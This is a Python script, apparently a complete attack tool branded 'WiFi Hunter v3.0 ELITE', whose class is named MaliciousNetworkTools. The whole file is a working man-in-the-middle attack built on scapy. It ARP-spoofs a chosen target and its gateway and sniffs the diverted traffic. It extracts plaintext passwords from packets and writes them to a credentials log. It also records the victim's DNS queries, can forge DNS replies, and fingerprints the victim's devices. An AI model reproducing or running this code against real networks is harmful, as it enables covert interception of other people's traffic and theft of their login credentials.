#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import scapy.all as scapy
import argparse, sys, threading, time, json, os, re
from colorama import Fore, Style, init
from datetime import datetime
from collections import defaultdict

init(autoreset=True)

class MaliciousNetworkTools:
    def __init__(self, config_file=None):
        self.target_ip = None
        self.gateway_ip = None
        self.verbose = False
        self.running = False
        self.packets_count = 0
        self.dns_queries = defaultdict(int)
        self.sessions = {}
        self.config = self.load_config(config_file)
        self.setup_logging()
        self.statistics = {
            'http_traffic': 0, 'https_traffic': 0, 'dns_traffic': 0,
            'mobile_devices': [], 'unique_ips': set(), 'data_transferred': 0,
            'credentials_found': [], 'start_time': datetime.now()
        }
        
    def setup_logging(self):
        self.log_dir = "logs"
        os.makedirs(self.log_dir, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.log_file = os.path.join(self.log_dir, f"network_{ts}.json")
        self.dns_log = os.path.join(self.log_dir, f"dns_{ts}.txt")
        self.session_log = os.path.join(self.log_dir, f"sessions_{ts}.json")
        self.creds_log = os.path.join(self.log_dir, f"credentials_{ts}.txt")
        
    def load_config(self, config_file):
        default = {
            'domain_blocking': True, 'blocked_domains': ['ads.google.com'],
            'ssl_interception': True, 'session_capture': True, 'mobile_detection': True,
            'dns_poisoning': False, 'credential_capture': True,
            'fake_ips': {'ads.google.com': '192.168.1.1'}
        }
        if config_file and os.path.exists(config_file):
            try:
                with open(config_file, 'r') as f:
                    return json.load(f)
            except:
                return default
        return default
    
    def print_banner(self):
        print(f"""{Fore.RED}
╔══════════════════════════════════════════════════════════╗
║          {Fore.CYAN}[ WIFI HUNTER v3.0 ELITE ]{Fore.RED}                    ║
║           {Fore.YELLOW}Advanced Network Penetration{Fore.RED}               ║
║         {Fore.MAGENTA}ARP │ DNS │ SSL │ CREDENTIAL{Fore.RED}               ║
║              {Fore.GREEN}~ by kaido dev ~{Fore.RED}                      ║
╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
""")
    
    def get_mac(self, ip):
        try:
            arp_req = scapy.ARP(pdst=ip)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            answered = scapy.srp(broadcast/arp_req, timeout=2, verbose=False)[0]
            return answered[0][1].hwsrc if answered else None
        except:
            return None
    
    def detect_mobile(self, mac):
        prefixes = {"ac:9b:0a": "iPhone", "52:54:00": "Android", "b0:95:75": "RPi"}
        for prefix, device in prefixes.items():
            if mac.lower().startswith(prefix):
                return device
        return None
    
    def poison_dns(self, target_ip, domain, fake_ip):
        try:
            dns_pkt = scapy.IP(dst=target_ip)/scapy.UDP(dport=53)/scapy.DNS(
                rd=1, qd=scapy.DNSQR(qname=domain),
                an=scapy.DNSRR(rrname=domain, ttl=10, rdata=fake_ip)
            )
            scapy.send(dns_pkt, verbose=False)
            if self.verbose:
                print(f"{Fore.RED}[!] POISON: {domain} -> {fake_ip}{Style.RESET_ALL}")
            return True
        except:
            return False
    
    def extract_creds(self, payload):
        try:
            s = payload.decode(errors='ignore')
            patterns = [r'password[=:]([^\s&"]+)', r'pass[=:]([^\s&"]+)']
            creds = []
            for p in patterns:
                creds.extend(re.findall(p, s, re.IGNORECASE))
            return creds
        except:
            return []
    
    def is_blocked(self, domain):
        if self.config.get('domain_blocking'):
            return any(b in domain for b in self.config.get('blocked_domains', []))
        return False
    
    def capture_session(self, src, dst, proto, size):
        if not self.config.get('session_capture'):
            return
        key = f"{src}:{dst}:{proto}"
        if key not in self.sessions:
            self.sessions[key] = {
                'start': datetime.now().isoformat(), 'proto': proto, 'data': 0, 'pkts': 0
            }
        self.sessions[key]['data'] += size
        self.sessions[key]['pkts'] += 1
    
    def packet_handler(self, pkt):
        self.packets_count += 1
        self.statistics['data_transferred'] += len(pkt)
        
        if pkt.haslayer(scapy.IP):
            self.statistics['unique_ips'].add(pkt[scapy.IP].src)
        
        if pkt.haslayer(scapy.DNSQR):
            try:
                dns = pkt[scapy.DNSQR].qname.decode().rstrip('.')
                self.dns_queries[dns] += 1
                self.statistics['dns_traffic'] += 1
                ts = datetime.now().strftime("%H:%M:%S")
                blocked = self.is_blocked(dns)
                status = f"{Fore.RED}[BLOCKED]{Style.RESET_ALL}" if blocked else ""
                print(f"{Fore.GREEN}[{ts}]{Style.RESET_ALL} DNS: {Fore.MAGENTA}{dns}{Style.RESET_ALL} {status}")
                with open(self.dns_log, 'a') as f:
                    f.write(f"[{ts}] {pkt[scapy.IP].src} -> {dns}\n")
                if blocked and self.config.get('dns_poisoning'):
                    fake = self.config.get('fake_ips', {}).get(dns, '192.168.1.1')
                    self.poison_dns(pkt[scapy.IP].src, dns, fake)
            except:
                pass
        
        if pkt.haslayer(scapy.TCP):
            tcp = pkt[scapy.TCP]
            if tcp.dport == 80:
                self.statistics['http_traffic'] += 1
            elif tcp.dport == 443:
                self.statistics['https_traffic'] += 1
            
            if pkt.haslayer(scapy.Raw) and self.config.get('credential_capture'):
                creds = self.extract_creds(bytes(pkt[scapy.Raw].load))
                if creds:
                    print(f"{Fore.RED}[!!!] CREDS FOUND: {creds}{Style.RESET_ALL}")
                    self.statistics['credentials_found'].append({
                        'src': pkt[scapy.IP].src, 'creds': creds, 'time': datetime.now().isoformat()
                    })
                    with open(self.creds_log, 'a') as f:
                        f.write(f"[{datetime.now().isoformat()}] {pkt[scapy.IP].src} - {creds}\n")
        
        if pkt.haslayer(scapy.ARP):
            try:
                mac = pkt[scapy.ARP].hwsrc
                device = self.detect_mobile(mac)
                if device and device not in self.statistics['mobile_devices']:
                    self.statistics['mobile_devices'].append(device)
                    print(f"{Fore.YELLOW}[+] DEVICE: {device}{Style.RESET_ALL}")
            except:
                pass
    
    def spoof_arp(self, target, spoof):
        try:
            tmac = self.get_mac(target)
            if not tmac:
                return False
            arp_pkt = scapy.ARP(op="is-at", pdst=target, hwdst=tmac, psrc=spoof)
            scapy.send(arp_pkt, verbose=False)
            return True
        except:
            return False
    
    def restore_arp(self, target, gw):
        try:
            tmac = self.get_mac(target)
            gmac = self.get_mac(gw)
            if tmac and gmac:
                arp_restore = scapy.ARP(op="is-at", pdst=target, hwdst=tmac, psrc=gw, hwsrc=gmac)
                scapy.send(arp_restore, verbose=False, count=5)
                return True
            return False
        except:
            return False
    
    def spoof_thread(self):
        print(f"{Fore.CYAN}[*] ARP SPOOFING ACTIVE{Style.RESET_ALL}\n")
        cnt = 0
        try:
            while self.running:
                self.spoof_arp(self.target_ip, self.gateway_ip)
                self.spoof_arp(self.gateway_ip, self.target_ip)
                cnt += 2
                if self.verbose and cnt % 20 == 0:
                    print(f"{Fore.GREEN}[+] {cnt} packets{Style.RESET_ALL}")
                time.sleep(1)
        except KeyboardInterrupt:
            pass
        finally:
            print(f"\n{Fore.YELLOW}[*] Restoring ARP...{Style.RESET_ALL}")
            for _ in range(5):
                self.restore_arp(self.target_ip, self.gateway_ip)
            print(f"{Fore.GREEN}[+] Done{Style.RESET_ALL}")
    
    def show_stats(self):
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[INTELLIGENCE REPORT]{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
        
        dur = (datetime.now() - self.statistics['start_time']).total_seconds()
        print(f"{Fore.YELLOW}ACTIVITY:{Style.RESET_ALL}")
        print(f"  Packets: {Fore.GREEN}{self.packets_count}{Style.RESET_ALL}")
        print(f"  Data: {Fore.GREEN}{self.statistics['data_transferred']/1024:.2f}KB{Style.RESET_ALL}")
        print(f"  Duration: {Fore.GREEN}{dur:.0f}s{Style.RESET_ALL}")
        print(f"  IPs: {Fore.GREEN}{len(self.statistics['unique_ips'])}{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}TRAFFIC:{Style.RESET_ALL}")
        print(f"  HTTP: {Fore.GREEN}{self.statistics['http_traffic']}{Style.RESET_ALL} | "
              f"HTTPS: {Fore.GREEN}{self.statistics['https_traffic']}{Style.RESET_ALL} | "
              f"DNS: {Fore.GREEN}{self.statistics['dns_traffic']}{Style.RESET_ALL}\n")
        
        if self.dns_queries:
            print(f"{Fore.YELLOW}TOP DNS:{Style.RESET_ALL}")
            for i, (d, c) in enumerate(sorted(self.dns_queries.items(), key=lambda x: x[1], reverse=True)[:5], 1):
                print(f"  {i}. {Fore.MAGENTA}{d}{Style.RESET_ALL} ({c})")
            print()
        
        if self.statistics['mobile_devices']:
            print(f"{Fore.YELLOW}DEVICES:{Style.RESET_ALL}")
            for d in self.statistics['mobile_devices']:
                print(f"  - {Fore.CYAN}{d}{Style.RESET_ALL}")
            print()
        
        if self.statistics['credentials_found']:
            print(f"{Fore.RED}CREDENTIALS: {len(self.statistics['credentials_found'])}{Style.RESET_ALL}\n")
        
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
        self.save_stats()
    
    def save_stats(self):
        stats_f = os.path.join(self.log_dir, f"stats_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
        data = {
            'packets': self.packets_count,
            'data': self.statistics['data_transferred'],
            'ips': list(self.statistics['unique_ips']),
            'http': self.statistics['http_traffic'],
            'https': self.statistics['https_traffic'],
            'dns': self.statistics['dns_traffic'],
            'devices': self.statistics['mobile_devices'],
            'creds': self.statistics['credentials_found'],
            'queries': dict(sorted(self.dns_queries.items(), key=lambda x: x[1], reverse=True))
        }
        try:
            with open(stats_f, 'w') as f:
                json.dump(data, f, indent=4)
            print(f"{Fore.GREEN}[+] Stats: {stats_f}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[-] {e}{Style.RESET_ALL}")
        
        if self.sessions:
            with open(self.session_log, 'w') as f:
                json.dump(self.sessions, f, indent=4)
    
    def execute(self, target, gw, mode="full"):
        self.target_ip = target
        self.gateway_ip = gw
        self.running = True
        
        self.print_banner()
        print(f"{Fore.CYAN}[>] Target: {Fore.YELLOW}{target}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[>] Gateway: {Fore.YELLOW}{gw}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[>] Mode: {Fore.YELLOW}{mode}{Style.RESET_ALL}\n")
        
        print(f"{Fore.CYAN}[*] Connecting...{Style.RESET_ALL}")
        tmac = self.get_mac(target)
        gmac = self.get_mac(gw)
        
        if not tmac or not gmac:
            print(f"{Fore.RED}[-] Failed{Style.RESET_ALL}")
            return False
        
        print(f"{Fore.GREEN}[+] Target MAC: {tmac}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Gateway MAC: {gmac}{Style.RESET_ALL}\n")
        
        if mode == "spoof":
            self.spoof_thread()
        elif mode == "sniff":
            try:
                scapy.sniff(prn=self.packet_handler, store=False)
            except KeyboardInterrupt:
                pass
        elif mode == "full":
            t = threading.Thread(target=self.spoof_thread, daemon=True)
            t.start()
            time.sleep(2)
            try:
                scapy.sniff(prn=self.packet_handler, store=False)
            except KeyboardInterrupt:
                pass
        
        return True

def main():
    parser = argparse.ArgumentParser(description="WiFi Hunter v3.0")
    parser.add_argument("-t", "--target", required=True, help="Target IP")
    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP")
    parser.add_argument("-m", "--mode", choices=["full", "spoof", "sniff"], default="full")
    parser.add_argument("-v", "--verbose", action="store_true")
    parser.add_argument("-c", "--config", help="Config file")
    args = parser.parse_args()
    
    tools = MaliciousNetworkTools(args.config)
    try:
        if tools.execute(args.target, args.gateway, args.mode):
            tools.show_stats()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Stopped{Style.RESET_ALL}")
        tools.running = False
        tools.show_stats()
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}[-] {e}{Style.RESET_ALL}")
        sys.exit(1)

if __name__ == "__main__":
    main()
